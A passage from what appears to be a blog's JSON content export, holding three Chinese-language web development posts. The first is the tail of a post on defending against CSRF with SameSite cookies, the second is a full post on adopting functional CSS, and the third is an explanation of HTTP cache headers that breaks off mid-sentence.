靠的核心概念是：「攻擊者的沒辦法讀寫目標網站的 cookie，所以 request 的 csrf token 會跟 cookie 內的不一樣」 browser 本身的防禦 我們剛剛提到了使用者自己可以做的事、網頁前後端可以做的事情，那瀏覽器呢？之所以能成立 CSRF，是因為瀏覽器的機制所導致的，有沒有可能從瀏覽器方面下手，來解決這個問題呢？ 有！而且已經有了。而且啟用的方法非常非常簡單。 Google 在 Chrome 51 版的時候正式加入了這個功能：SameSite cookie，對詳細運行原理有興趣的可參考：draft-west-first-party-cookies-07。 先引一下 Google 的說明： Same-site cookies (née “First-Party-Only” (née “First-Party”)) allow servers to mitigate the risk of CSRF and information leakage attacks by asserting that a particular cookie should only be sent with requests initiated from the same registrable domain. 啟用這個功能有多簡單？超級無敵簡單。 你原本設置 Cookie 的 header 長這樣： 1Set-Cookie: session_id=ewfewjf23o1; 你只要在後面多加一個 SameSite 就好： 1Set-Cookie: session_id=ewfewjf23o1; SameSite 但其實 SameSite 有兩種模式，Lax跟Strict，默認是後者，你也可以自己指定模式： 12Set-Cookie: session_id=ewfewjf23o1; SameSite=StrictSet-Cookie: foo=bar; SameSite=Lax 我們先來談談默認的 Strict模式，當你加上 SameSite 這個關鍵字之後，就代表說「我這個 cookie 只允許 same site 使用，不應該在任何的 cross site request 被加上去」。 意思就是你加上去之後，我們上面所講的&lt;a href=&quot;&quot;&gt;, &lt;form&gt;, new XMLHttpRequest，只要是瀏覽器驗證不是在同一個 site 底下發出的 request，全部都不會帶上這個 cookie。 可是這樣其實會有個問題，連&lt;a href=&quot;...&quot;都不會帶上 cookie 的話，當我從 Google 搜尋結果或者是朋友貼給我的連結點進某個網站的時候，因為不會帶 cookie 的關係，所以那個網站就會變成是登出狀態。這樣子的使用者體驗非常不好。 有兩種解法，第一種是跟 Amazon 一樣，準備兩組不同的 cookie，第一組是讓你維持登入狀態，第二組則是做一些敏感操作的時候會需要用到的（例如說購買、設定帳戶等等）。第一組不設定 SameSite，所以無論你從哪邊來，都會是登入狀態。但攻擊者就算有第一組 cookie 也不能幹嘛，因為不能做任何操作。第二組因為設定了 SameSite 的緣故，所以完全避免掉 CSRF。 但這樣子還是有點小麻煩，所以你可以考慮第二種，就是調整為 SameSite 的另一種模式：Lax。 Lax 模式放寬了一些限制，例如說&lt;a&gt;, &lt;link rel=&quot;prerender&quot;&gt;, &lt;form method=&quot;GET&quot;&gt; 這些都還是會帶上 cookie。但是 POST 方法 的 form，或是只要是 POST, PUT, DELETE 這些方法，就不會帶上 cookie。 所以一方面你可以保有彈性，讓使用者從其他網站連進你的網站時還能夠維持登入狀態，一方面也可以防止掉 CSRF 攻擊。但 Lax 模式之下就沒辦法擋掉 GET 形式的 CSRF，這點要特別注意一下。 講到這種比較新的東西，相信大家一定都很想知道瀏覽器的支援度如何，caniuse 告訴我們說：目前只有 Chrome 支援這個新的特性（畢竟是 Google 自己推的方案，自己當然要支持一下）。 雖然瀏覽器的支援度不太高，但日後其他瀏覽器可能也會跟進實做這個方案，不妨在現在就把 SameSite 加上去，以後就不用再為 CSRF 煩惱了。 我其實只是大略的介紹一下，draft-west-first-party-cookies-07 裡面講到很多細節，例如說到底怎樣算是 cross site? 一定要在同一個 domain 嗎？那 sub domain 行不行？ 好奇的可以自己研究一下，或者是這篇：SameSite Cookie，防止 CSRF 攻击也有提到。 SameSite 相關的參考資料： Preventing CSRF with the same-site cookie attribute 再见，CSRF：讲解set-cookie中的SameSite属性 SameSite Cookie，防止 CSRF 攻击 SameSite——防御 CSRF &amp; XSSI 新机制 Cross-Site Request Forgery is dead! 總結 這篇主要介紹了 CSRF 的攻擊原理以及兩種防禦方法，針對比較常見的場景做介紹。一般在做網頁開發的時候，比起 XSS，CSRF 是一個比較常被忽略的重點。在網頁上有任何比較重要的操作時，都要特別留意是否有被 CSRF 的風險。 這次找了很多參考資料，但發現跟 CSRF 有關的文章其實都大同小異，想知道更細節的地方需要花很多的心力去找，但幸好 Stackoverflow 上面也有不少資料可以參考。因為我在資訊安全這塊沒有涉獵太多，如果文章有哪部分講錯的話，還麻煩各位在留言不吝指出。 也感謝我朋友 shik 的指點，告訴我有 SameSite 這麼一個東西，讓我補上最後一段。 希望這篇文章能讓大家對 CSRF 有更全面的認識。 參考資料 Cross-Site Request Forgery (CSRF) Cross-Site Request Forgery (CSRF) Prevention Cheat Sheet 一次较为深刻的CSRF认识 [技術分享] Cross-site Request Forgery (Part 2) Spring Security Reference CSRF 攻击的应对之道","link":"/2017/03/12/csrf-introduction/"},{"title":"邪魔歪道還是苦口良藥？Functional CSS 經驗分享","text":"前言 以 CSS 架構方法來說，主流的大概可以分成三個：OOCSS、SMACSS、BEM，這些架構的提出都是為了讓 CSS 更好維護，這幾個的介紹以及差異可以參考 @arvinh 寫過的 淺談 CSS 方法論與 Atomic CSS。 但我們今天要談的不是上面提到的這三種，而是另外一種相較之下沒那麼主流（但好像有慢慢流行的趨勢），而且很少人第一眼看到就會贊同的方法：functional CSS。 什麼是 functional CSS 直接舉一個例子最快： 123456789101112131415161718192021// 一般的寫法&lt;div class=\"hello\"&gt;Hello&lt;/div&gt; .hello &#123; font-weight: 700; color: red; padding: 1rem;&#125; // Functional CSS&lt;div class=\"fw7 red pa3\"&gt;Hello&lt;/div&gt; .fw7 &#123; font-weight: 700;&#125;.red &#123; color: red;&#125;.pa3 &#123; padding: 1rem;&#125; 就好像 functional programming 那樣，每個函式都沒有副作用而且可以互相組合，在 functional CSS 裡面每一個 class name 都只負責一個部分（不一定是一個屬性），就像我上面舉的那個範例，它會產生一個字是粗體、紅色並且有 padding 的 div。 順帶一提，如果你有用過 Bootstrap4 的話，你很有可能已經體驗過 functional CSS 了，裡面就出現了一大堆這種類型的 class name 。 你喜歡這種風格的寫法嗎？ 如果你是第一次看到這種寫法，我覺得你心裡想的應該是：「這是三小，好噁心」、「這不就是 inline style 嗎」、「這根本不是 CSS 吧！」 沒關係，我第一眼看到也是這樣覺得的，但會寫這篇文章就是因為我後來改觀了，於是接下來我要談談我與 functional CSS 從互相厭惡到和解的過程。 我與 functional CSS 的愛恨糾葛 一開始看到 functional CSS 覺得很特別但也很奇怪，老實說連想試的感覺都沒有，只覺得這樣寫 CSS 也太奇怪了吧，根本就是邪魔歪道！而且 class name 一點可讀性都沒有。 但有天我在 hacker news 上面讀到了這篇文章：In defense of Functional CSS，徹底改變了我對它的想法。 這篇文章針對幾個常見的批評給予了反駁，我下面舉幾個文章裡面提的例子： 跟 inline style 差在哪？ Inline style 不能有 media query inline style 的屬性可以隨意設置（這之後我會講詳細一點） Inline style 沒辦法處理 :before, :after Inline style 無法重用，但是 css class 可以，我可以定義一個叫做 .bg-red 的規則，想要背景是紅色的加上去就行了 Inline style 跟 functional css 的可讀性還是有差，比比看 class=&quot;f-sm bg-blue&quot; 跟 style=&quot;font-size: 10px; background-color: #0000ff;&quot; 我覺得作者的幾個反駁都滿合理的，inline style 跟 functional CSS 的確是有差，我想讀到這裡大家應該可以認同如果這兩個一定要選一個，選後者是合理許多的，因為可重用而且可讀性較高。 但大多數人反對 functional CSS 的主要理由還有一個，那就是會把 html 弄的很髒而且不知道在幹嘛。 例如說原文中提到的範例： 123456789101112131415&lt;div class=\"profile-card\"&gt; ...&lt;/div&gt;&lt;style&gt; .profile-card &#123; padding: 20px; margin: 20px; color: #eee; background: #333; border: 1px solid #555; &#125;&lt;/style&gt;&lt;div class=\"m-5 p-5 text-gray-light bg-gray-darker border border-gray-light\"&gt; ...&lt;/div&gt; 前者你一看就知道是一個 profile card，但後者你光看 html 根本看不出來他是什麼。 在這邊作者給的解釋我覺得也很不錯： 你可以一起用啊 對欸，你可以變成這樣： 123&lt;div class=\"profile-card m-5 p-5 text-gray-light bg-gray-darker border border-gray-light\"&gt; ...&lt;/div&gt; 這樣你可以維持原有的 class name 命名方式，而這個命名只是為了方便讓你辨識出這個元素是什麼，實際上在做 styling 的還是後面的那些 functional class name。 如果還想再反駁，大概就是 html 看起來還是很髒而且一大堆 class name。我覺得這是優點也是缺點，端看你怎麼去看它。 若是你完全不知道那些 class name 是什麼意思，你當然會覺得那是一堆垃圾；但如果你知道是什麼意思，你會發現光是看 HTML，你就可以知道樣式長怎樣，你不必在 HTML 與 CSS 之間切換，而是只要專注在 HTML 就好，因為它的樣式都寫在 class name 裡面了。 舉例來說，你原本的開發流程可能是這樣： 建立一個 profile-card 的html 加上 .profile-card class name 開一個 profile-card.css 開始寫樣式 新增 profile-card-avatar 的 html 加上 .profile-card-avatar 的 html 開始幫這個 class name 寫樣式 但採用 functional CSS 之後，開發流程變這樣： 建立一個 profile-card 的html 幫 profile-card 加上 class name 新增 profile-card-avatar 的html 幫 profile-card-avatar 加上 class name 不用再在 HTML 與 CSS 間切換，因為沒有 CSS 檔案讓你切換。 可是重用性太低了吧，我要幫每個 button 都寫 20 個 class？ 這個批評基本上是說，假設我有一個 button 用 functional css 之後長這樣： &lt;div class=&quot;bg-blue fw5 pa1&quot;&gt;Click me&lt;/div&gt; 那如果我有其他地方要用這個 button，我不就要複製這一串？如果我 button 的樣式換了，那我不就所有地方都要改？這個重用性也太差了吧。 原文中給的反駁是如果真的有這種情況發生，你應該優先考慮的是把這段 HTML 抽成可重用的 template 之類的，而不是把這個問題怪到 class 身上。 或者我這樣說好了，應該把這個東西變成一個 component，這樣問題就迎刃而解了，因為你只要改 component 就好，不用每個地方都改。 以上就是這篇文章大概的內容，有興趣的可以去看原文，原文寫的比我摘要得清楚滿多的而且講了更多。但總之我看完這篇文章之後有了些想法，並且開始認識到 functional CSS 的好處到底在哪。 Functional CSS 到底好在哪？ 第一個好處就是你從此（幾乎）不必再寫 CSS！而且你也不用再猶豫 class name 到底要取什麼了！ 這簡直拯救了一堆有命名恐懼症的開發者。用了 functional CSS 以後只要幫 html 加上相對應的 class 就好，就如同我上面舉的範例那樣。 這時候你可能會說：「那我要怎麼知道這段 HTML 到底是幹嘛的？」 第一種解法上面有提過，就是把原本的 class 也加回去，所以有意義的 class name 當作辨識用途，functional css 當作樣式來使用，但這個方法我個人覺得有點多此一舉就是了，而且還要再花時間想要命名什麼 class。 第二種解法是 component，我後來意識到有些 functional CSS 會碰到的問題可以靠 component 來解，這個 component 可以是 web-component 也可以是 React 或是 Vue 裡面的那種 component。 當我們有了 component 以後，就沒有那麼需要 class name 了，因為你看 component 的名稱就知道它是個按鈕，從元件的命名就可以知道，不必再從 class name。況且就算原本有 class name，你還是要先去對照畫面才能確定你到底要改哪裡，畢竟有些 class name 命名的超級模糊，這我相信大家一定都有體會過。 原本在寫 CSS 時你需要考慮的很多東西，到了 functional CSS 幾乎都不存在，你要做的只有幫 HTML 加上 functional CSS 的 class name 幫它裝飾而已。 第二個好處是你一但採用 functional CSS，就可以立刻幫你的 project 產生出一套規範，有點像是 design guideline 那樣。 這是什麼意思呢？ 首先，大家可能會對 functional CSS 有個錯誤認知，那就是覺得它說穿了還是另外一種形式的 inline style，只是多此一舉寫成 class 而已。 不是的，它並不是你想用什麼就用什麼，而是先把規範訂好，你再從可以用的 class 裡面去挑你要用的出來。例如你們產品的網站的背景有兩種主色分別是紅色與藍色，於是你寫了 .bg-red 跟 .bg-blue 這兩個 class。 今天有一個新人來你們公司，他想用紅色就會直接用 bg-red 而不是自己再寫一個 class。如果他真的再寫一個，那 code review 時也可以輕易抓到，因為用了 functional css 的專案通常 CSS 檔案寫好後就不會再變動了，所以有更動的時候特別明顯。 如果今天是按照以前寫 CSS 的方式，有可能他在 CSS 裡面就偷懶直接寫色碼而不是用你在 color.scss 定義好的變數，或也有可能他在 color.scss 裡面眼殘沒看到 bg-red，所以自己加個 bg_red 的 class。 是的，這一樣在 code review 的時候可以抓到，但我想表達的是前者耗費的心力會比後者少，因為要檢查的地方比較少。 一但 functional CSS 的主要 style.css 完成後，這份檔案同時也代表網站的規範，可以使用的顏色、padding、margin、字體、字體大小都在裡面了，想用的時候只能從這裡面找，不能自己隨意新增，所以你可以很輕鬆就規定網站的 padding 只能是 4、8 或是 16，或是行距只能有 1、1.25 跟 1.5。 其實以前用 SCSS 或任何 CSS 預處理器時也可以這樣做，把所有規範都訂成變數，並且規定所有規則都只能用這些變數。但我認為 functional CSS 天生就蘊含著規範在裡面。 第三個好處是檔案大小驟減，因為 padding: 4px 只會在 CSS 檔案裡面出現唯一一次，color: red 也只會出現唯一一次，以 functional CSS 的 framework Tachyons 來說，minified 跟 gzipped 過後的 CSS 大小是 14kb。 現在是 14kb，以後也會是 14kb，因為你所有需要的規則都在裡面了，你的 CSS 大小不會再隨著網站的複雜度增加，這也是很棒的一點。 另外一個 functional CSS framework Tailwind 的作者寫了一篇很棒的文章來探討一些優缺點，並且有脈絡地帶你看 functional CSS 的優勢在哪，我自認絕對不可能寫的比那篇好，所以有興趣再深入理解的可以參考：CSS Utility Classes and “Separation of Concerns”。 總之呢，在爬了一大堆文章以及跟同事討論過以後，我們決定把公司的產品換成 functional CSS，會想換的原因有兩個： CSS 越來越多以後很難維護，只要不小心一個偷懶就成了未來的技術債 CSS 檔案越來越大，但其實可以小很多 Function CSS 實戰經驗分享 之前看過一篇 Full re-write in 10 days with tachyons and functional CSS: A case study，作者講述他如何輕鬆寫意的在十天裡面把整個網站改寫完成。 而我們那時除了要重構這些 CSS 以外還要修 bug 跟開發新的功能，所以前前後後大概一個月才把整個網站換完，而且實際下去重構才發現以前寫的有些 CSS 真的是超難維護，因此在這部分也多花了點時間。 上面有提到幾個相關的 CSS framework，但我認為 functional CSS 的概念簡單好懂，自己從頭實作一個反而比較符合自己的需求，於是就參考 Tachyons 的 class name 來實作。 第一步大概是先把一些常用的 class 定出來，例如說顏色： 12345678.c-red &#123; color: $color-red; &#125;.c-yellow &#123; color: $color-yellow; &#125;.c-white &#123; color: white; &#125;.c-green &#123; color: $color-green; &#125;.c-grey-83 &#123; color: $color-grey-83; &#125;.c-grey-4a &#123; color: $color-grey-4a; &#125;.c-grey-bb &#123; color: $color-grey-bb; &#125;.c-grey-f8 &#123; color: $color-grey-f8; &#125; 還有必備的 flex 排版： 1234567891011121314151617.flex &#123; display: flex; &#125;.inline-flex &#123; display: inline-flex; &#125;.flex-auto &#123; flex: 1 1 auto; &#125;.flex-column &#123; flex-direction: column; &#125;.flex-row &#123; flex-direction: row; &#125;.flex-wrap &#123; flex-wrap: wrap; &#125;.flex-nowrap &#123; flex-wrap: nowrap; &#125;.items-start &#123; align-items: flex-start; &#125;.items-end &#123; align-items: flex-end; &#125;.items-center &#123; align-items: center; &#125;.items-baseline &#123; align-items: baseline; &#125;.items-stretch &#123; align-items: stretch; &#125;.justify-start &#123; justify-content: flex-start; &#125;.justify-end &#123; justify-content: flex-end; &#125;.justify-center &#123; justify-content: center; &#125;.justify-between &#123; justify-content: space-between; &#125;.justify-around &#123; justify-content: space-around; &#125; 除此之外，也可以自己寫一些 utility class： 123456789101112131415.ellipsis &#123; overflow: hidden; text-overflow: ellipsis;&#125; .limit-line &#123; overflow: hidden; text-overflow: ellipsis; display: block; display: -webkit-box; -webkit-line-clamp: 1; -webkit-box-orient: vertical;&#125; .pointer:hover &#123; cursor: pointer; &#125; 這就呼應我前面提到的，一個 class name 其實可以有一個以上的規則，只要你能從 class 的名稱清楚知道它在做什麼就好。 重構時的流程其實很固定，基本上就是這幾步： 選定要重構的 component 先從最裡層開始，右鍵檢查，確定這個 class name 沒有其他副作用 把原本的 style 換成 functional CSS 把原本的 class name 移除 在此過程中可以順便把網站的樣式做個規範，例如說原本 padding 是 5 的地方統一變成 4 等等，網站就會變得越來越規範。 不過重構時當然也碰到一些困難，那就是有些以前寫的 CSS 為了圖方便沒有考慮到維護性的問題，到頭來這個坑還是落到自己身上。舉例來說，有個元件叫做 Card，需求是在首頁以及在餐廳頁面它的 padding 不一樣，所以以前就這樣寫： 123456789101112131415161718// home_page.scss.home-page &#123; .card &#123; padding: 10px &#125;&#125; // restaurant_page.scss.restaurant-page &#123; .card &#123; padding: 15px; &#125;&#125; // card.scss.card &#123; padding: 20px;&#125; 問題是什麼？問題是如果你只看 .card 的 CSS，你根本不會發現它在不同的頁面下會有不同的 padding！如果只是 padding 的話問題還小，但如果依照這個邏輯繼續往下寫，有可能連顏色跟 margin 都變了，像是： 123456789.home-page &#123; .card &#123; padding: 10px &amp;__title &#123; margin-top: 20px; background: red; &#125; &#125;&#125; 這種做法是把顯示的邏輯放在 CSS 裡面，利用 CSS 去操控，所以 JS 裡面不用額外寫任何東西，Card 這個 component 在不同地方就會有不同的樣式。 但我後來覺得這樣不是種好作法，應該要把邏輯移回 JS 裡面比較好，所以改成這樣寫： 1234567891011121314// home page&lt;Card type=\"home\" /&gt; // restaurant page&lt;Card type=\"restaurant\" /&gt; // Card componentfunction Card(&#123; type &#125;) =&gt; ( &lt;div className=&#123;cx(&#123; 'padding-20': !type, 'padding-10': type === 'home', 'padding-15': type === 'restaurant' &#125;)&#125; /&gt;) 在不同地方我用 component 的 props 來區分，並且把這段邏輯放在 component 裡面，比起 CSS 的做法當然有好有壞，但至少可以保證當我 render 單純的 &lt;Card /&gt; 的時候，在任何一個頁面它的樣式都會是一致的，不用擔心在不同地方會突然出現不同的樣式。 在重構的過程中其實發現很多這種問題，如果沒有趁早除掉的話 CSS 只會越來越多而且越來越亂，到最後會變得超級難維護，會很容易發生改一個 class 壞兩個地方，牽一髮動全身的現象。因此剛好趁著改寫成 functional CSS 的時候來處理這些問題。 許多人對 functional CSS 還有一個誤解，那就是不能寫「其他的」 CSS。舉例來說，我前面提到 functinoal CSS 自成一個規範，沒有寫成 class 的東西你不能用，但其實有些特殊情況還是可以的。 例如說你今天有一個 div 的高是 333px，難道你就要寫一個 .height-333 的 class 嗎？如果真是這樣的話那真的跟 inline style 沒兩樣了。 但 functional CSS 考量的點應該是「能否重用」，能夠重複使用的才把它寫成 class name，像是高 333px 這種我就會直接用 styled-component 或甚至直接寫 inline style，不會特地給它一個 .height-333 的 class，因為整個 App 可能就只有它用得到。 最後讓我們來看一下改寫的成果，這是改寫前，CSS 大約 400kb（gzipped 前）： 這是改寫後，可以看到各項數據都下降很多，CSS 大約 130kb，其實還可以再小，會比較大是因為裡面有一些轉成 base64 的小圖： 改寫之後減少了將近 70% 的 CSS 體積。 而且重點是無論以後 App 大了十倍還是一百倍，CSS 都能夠維持在差不多的大小，因為常用的屬性都被我們變成 class name 了。 改寫的難易度取決於你原本 CSS 的質量，像我們很多 CSS 為了求快沒有多思考耦合就很高，常常要參考兩三個 CSS 檔案才能拼湊出最後 style 的長相。但如果原本就有處理好這個問題，速度應該能夠快滿多的。但整體來說改寫還是算是容易，而且每次改寫完成就感很大，可以直接把一大堆 CSS 規則刪掉，滿有快感的。 有興趣的朋友可以用這個網站對自己的產品做測試：https://cssstats.com/。 總結 如果要說 functional CSS 有什麼缺點的話，我目前想到的就是剛開始學習需要一段時間以及 style 多的話 HTML 會變得充滿一堆 class name，比較難閱讀而且檔案也較大，但相較之下我依然認為優點是多過缺點的。 優點前面也大概都說過，基本上就是不用擔心 CSS 的耦合性問題，絕對不會發生改一個 class name 壞兩個 component 的情況，因為每個 class name 都不會互相干擾，也可以保證你把這個 component 搬到任何地方都還是長得一樣，背後不會有特別的 CSS 在那邊搞你。 也不用再煩惱 class name 要怎麼命名了因為你不需要，這個就可以節省滿多時間的。也不用再手寫 CSS 了，所以開發速度也變快了，因為不用再在 CSS 檔案與 component 之間切換，你邊寫 HTML 的時候就可以順手把 style 寫完，存檔以後看個畫面再調整一下就行了，跟以前相比步驟少了很多。 其實對 CSS 我的經驗不是那麼多，可能有很多 case 沒有考慮到或是優缺點沒有講得很清楚，如果對 functional CSS 想要更深入研究的，我文末附的資料都很有參考價值，大家可以看看。 但總之，我現在是 functional CSS 的支持者之一了。 參考資料： In defense of Functional CSS Tachyons Full re-write in 10 days with tachyons and functional CSS: A case study Tailwind: style your site without writing any CSS! CSS Utility Classes and “Separation of Concerns” HN 上面的討論","link":"/2019/01/27/functional-css/"},{"title":"循序漸進理解 HTTP Cache 機制","text":"前言 前陣子在研究跟 HTTP Cache 有關的一些東西，看得眼花撩亂，不同的 Header 愈看愈混亂，像是Pragma, Cache-Control, Etag, Last-Modified, Expires 等等。找了許多參考資料閱讀之後才有了比較深刻的理解，想說若是從一個比較不同的角度來理解 Cache，說不定會比較容易了解這些 Header 到底在做什麼。 在之前查的資料裡面，很多篇都是逐一解釋各個 Header 的作用以及參數，而我認為其實參數講多了容易造成初學者混淆，想說怎麼有這麼多奇怪的參數，而且每一個看起來都很像。所以這篇文章嘗試一步一步藉由不同的問題來引導出各個 Header 使用的場景以及出現的目的。還有，因為這篇是給初學者看的，所以不會講到所有的參數。 其實關於 Cache 這一部分，很多網路資源的說法都不太一樣，如果碰到有疑義的地方我會盡量以 RFC 上面寫的標準為主。如果有錯誤的話還麻煩不吝指正，感謝。 為什麼需要 Cache 多問為什麼是個好習慣，在你用一個東西之前，必須知道你為什麼要用它。於是，我們需要問自己一個問題：為什麼需要 Cache？ 很簡單，因為節省流量嘛，也節省時間，或是更宏觀地來說，減少資源的損耗。 舉例來說，今天電商網站的首頁可能會有很多商品，如果你今天每一個訪客到首頁你都去資料庫重新抓一次所有的資料，那對資料庫的負擔會非常非常大。 可是呢，其實首頁的這些資訊基本上短期之內是不會變的，一個商品的價格不可能上一秒是一千元，下一秒就變成兩千元。所以這些不常變動的資料就很適合儲存起來，也就是我們說的 Cache，台灣翻譯叫做快取，中國翻譯叫做緩存。 上面這個例子可以把首頁的那些資訊在撈出來一次之後就存在某個地方，例如說 Redis，其實就是以一個簡單的 Key Value Pair 的形式存進去即可，接著只要是用到這些資訊的時候，都可以用極快的速度撈出來，而不是再到資料庫裡面重新算一次。 上面講的是 Server side 的 Cache，藉由把 Database 的資料撈出來之後存到別的地方達成。但 Server side 的 Cache 並不是我們今天的重點，有興趣的讀者們可以參考我之前寫過的：資料庫的好夥伴：Redis。 今天的重點是 Server 跟瀏覽器之間的 Cache 機制。 例如說電商網站的商品圖好了。如果沒有 Cache 的話，那首頁出現的上百張商品圖，只要網頁被瀏覽幾次，就會被下載幾次，這個流量是非常驚人的。所以我們必須讓瀏覽器可以把這些圖片給 Cache 起來。這樣只有第一次瀏覽這個網頁的時候需要重新下載，第二次瀏覽的時候，圖片就可以直接從瀏覽器的快取裡面去抓，不用再跟 Server 拿資料了。 Expires 要達成上述的功能，可以在 HTTP Response Header 裡面加上一個Expires的字段，裡面就是這個 Cache 到期的時間，例如說： 1Expires: Wed, 21 Oct 2017 07:28:00 GMT 瀏覽器收到這個 Response 之後就會把這個資源給快取起來，當下一次使用者再度造訪這個頁面或是要求這個圖片的資源的時候，瀏覽器會檢視「現在的時間」是否有超過這個 Expires。如果沒有超過的話，那瀏覽器「不會發送任何 Request」，而是直接從電腦裡面已經存好的 Cache 拿資料。 若是打開 Chrome dev tool，就會看到它寫著：「Status code 200 (from disk cache)」，代表這個 Request 其實沒有發出去，Response 是直接從 disk cache 裡面拿的。 可是這樣其實會碰到一個問題，因為瀏覽器檢視這個 Expires 的時間是用「電腦本身的時間」，那如果我喜歡活在未來，把電腦的時間改成 2100 年，會怎樣呢？ 瀏覽器就會覺得所有的 Cache 都是過期的，就會重新發送 Request。 Cache-Control 與 max-age Expires 其實是 HTTP 1.0 就存在的 Header，而為了解決上面 Expires 會碰到的問題，HTTP 1.1 有一個新的 header 出現了，叫做：Cache-Control。（註：Cache-Control 是 HTTP 1.1 出現的 Header，但其實不單單只是解決這個問題，還解決許多 HTTP 1.0 沒辦法處理的快取相關問題） 其中一種用法是：Cache-Control: max-age=30，就代表這個 Response 的過期時間是 30 秒。假設使用者在收到這個 Response 之後的第 10 秒重新整理，那就會出現上面那樣被瀏覽器 Cache 住的現象。 但假如使用者是過 60 秒之後才重新整理，瀏覽器就會發送新的 Request。 仔細觀察 Google Logo 檔案的 Response header，你會發現它的max-age設定成31536000秒，也就是 365 天的意思。只要你在一年之內造訪這個網站，都不會對 Google logo 這張圖片送出 Request，而是會直接使用瀏覽器已經快取住的 Response，也就是這邊寫的Status code 200 (from memory cache)。 現在就碰到一個問題了，既然Expires跟max-age都可以決定一個 Response 是否過期，那如果兩個同時出現，瀏覽器要看哪一個呢？ 根據RFC2616的定義： If a response includes both an Expires header and a max-age directive, the max-age directive overrides the Expires header, even if the Expires header is more restrictive max-age會蓋過Expires。因此現在的快取儘管兩個都會放，但其實真正會用到的是max-age。 過期了，然後呢？ 上面這兩個 Header 都是在關注一個 Response 的「新鮮度(freshness)」，如果 Response 夠新鮮的話（也就是還沒超過Expire或者是在max-age規定的期限裡面），就直接從快取裡面拿資料。如果過期了、不新鮮了，就發送 Request 去跟 Server 拿新的資料。 但是這邊要特別注意一點：「過期了不代表不能用」 這是什麼意思呢？剛剛有提到說 Google 的 Logo 快取時間是一年，一年之後瀏覽器就會重新發出 Request 對吧？可是很有可能 Google 的 Logo 在一年之後也不會換，代表其實瀏覽器快取起來的圖片還是可以用的。 如果是這種情況，那 Server 就不必返回新的圖片，只要跟瀏覽器說：「你快取的圖片可以繼續用一年喔」就可以了。 Last-Modified 與 If-Modified-Since 想要做到上面的功能，必須要 Server 跟 Client 兩邊互相配合才行。其中一種做法就是使用 HTTP 1.0 就有的：Last-Modified與If-Modified-Since的搭配使用。 在 Server 傳送 Response 的時候，可以多加一個Last-Modified的 Header，表示這個檔案上一次更改是什麼時候。而當快取過期，瀏覽器下次再發送 Request 的時候，就可以利用這個資訊，改用If-Modified-Since來跟 Server 指定拿取：某個時間點以後有更改的資料。 直接舉一個例子吧，假設我要求 Google 首頁的圖片檔案，收到了這樣的 Response（為了方便閱讀，日期的格式有更改過，實際上的內容不會是這樣）： 12Last-Modified: 2017-01-01 13:00:00Cache-Control: max-age=31536000 瀏覽器收到之後就會把這張圖片存進快取，並且標明這個檔案的最後更新時間是：2017-01-01 13:00:00，過期時間是一年後。 如果在半年後我重新請求這張圖片，瀏覽器就會跟我說：「你不用重新請求喔，這一份檔案的過期時間是一年，現在才過了半年。你要資料是吧？我這邊就有囉！」，於是就不會發送任何 Request，而是直接從瀏覽器那邊獲得資料。 接著我在過了一年之後再請求一次這張圖片，瀏覽器就會說：「嗯嗯，我這邊的快取的確過期了，我幫你去 Server 問一下檔案從2017-01-01 13:00:00以後有沒有更新」，會發送出下面這樣的 Request： 12GET /logo.pngIf-Modified-Since: 2017-01-01 13:00:00 假設檔案確實更新了，那瀏覽器就會收到一份新的檔案。如果新的檔案一樣有那些 Cache 的 Header，就一樣會快取起來，跟上面的流程都一樣。那假設檔案沒有更新呢？ 假設沒有更新的話，Server 就會回一個Status code: 304 (Not Modified)，代表你可以繼續沿用快取的這份檔案。 Etag 與 If-None-Match 雖然上面的這個方法看起來已經很好了，但還是有一個小問題。 上面講的是檔案有沒有被「編輯」過，但其實這個編輯時間就是你電腦上檔案的編輯時間。若是你打開檔案什麼都不做，然後存檔，這個編輯時間也會被更新。可是儘管編輯時間不一樣，檔案的內容還是一模一樣的。 比起編輯時間，若是能用「檔案內容更動與否」來當作是否要更新快取的條件，那是再好不過了。 而Etag這個 Header 就是這樣的一個東西。你可以把 Etag 想成是這份檔案內容的 hash 值（但其實不是，但原理類似就是了，總之就是一樣的內容會產生一樣的 hash，不一樣的會產生不一樣的 hash）。 在 Response 裡面 Server 會帶上這個檔案的 Etag，等快取過期之後，瀏覽器就可以拿這個 Etag 去問說檔案是不是有被更動過。 Etag跟If-None-Match也是搭配使用的一對，就像Last-Modified跟If-Modified-Since一樣。 Server 在回傳 Response 的時候帶上Etag表示這個檔案獨有的 hash，快取過期後瀏覽器發送If-None-Match詢問 Server 是否有新的資料（不符合這個Etag的資料），有的話就回傳新的，沒有的話就只要回傳 304 就好了。 流程可以參考 Google 網站上的下圖： （圖片來源：https://developers.google.com/web/fundamentals/performance/optimizing-content-efficiency/images/http-cache-control.png?hl=zh-tw） 中場休息 讓我們來總結一下到目前為止學到的東西： Expires跟Cache-Control: max-age決定這份快取的「新鮮度」，也就是什麼時候「過期」。在過期之前，瀏覽器「不會」發送出任何 Request 當快取過期之後，可以用If-Modified-Since或是If-None-Match詢問 Server 有沒有新的資源，如果有的話就回傳新的，沒有的話就回傳 Status code 304，代表快取裡面的資源還能繼續沿用。 有了這幾個 Header 之後，世界看似美好，好像所有的問題都解決了一樣。 是的，我說「好像」，代表其實還有一些問題存在。 不要快取怎麼辦？ 有一些頁面可能會不想要任何的快取，例如說含有一些機密資料的頁面，就不希望任何的東西被保留在 Client 端。 還記得我們一開始有提過Cache-Control這個 Header 其實解決了更多問題嗎？除了可以指定max-age以外，可以直接使用：Cache-Control: no-store，代表說：「我就是不要任何快取」。 因此每一次請求都必定會到達 Server 去要求新的資料，不會有任何資訊被快取住。 （註：HTTP 1.0 裡面有一個Pragma的 Header，使用方法只有一種，就是：Pragma: no-cache，有網路上的資料說它就是不要任何快取的意思，但根據RFC7232的說法，這個用法應該跟Cache-Control: no-cache一樣，而不是Cache-Control: no-store，這兩個的差異等等會提到） 首頁的快取策略 剛剛上面提到的都是一些靜態資源例如說圖片，特性就是會有好一陣子不會變動，因此可以放心地使用max-age。 但現在我們考慮到另外一種狀況，那就是網站首頁。 網站首頁雖然也不常會變動，但我們希望只要一變動，使用者就能夠馬上看到變化。那要怎麼辦呢？設max-age嗎？也是可以，例如說Cache-Control: max-age=30，只要過 30 秒就能讓快取過期，去跟 Server 拿新的資料。 但如果我們想要更即時呢？只要一變動，使用者就能夠馬上看到變化。你可能會說：「那我們可以不要快取就好啦，每次都抓取新的頁面」。可是如果這個首頁有一個禮拜都沒有變，其實使用快取會是比較好的辦法，節省很多流量。 因此我們的目的是：「把頁面快取起來，但只要首頁一變動，就能夠立刻看到新的頁面」 這個怎麼做到呢？第一招，你可以用Cache-Control: 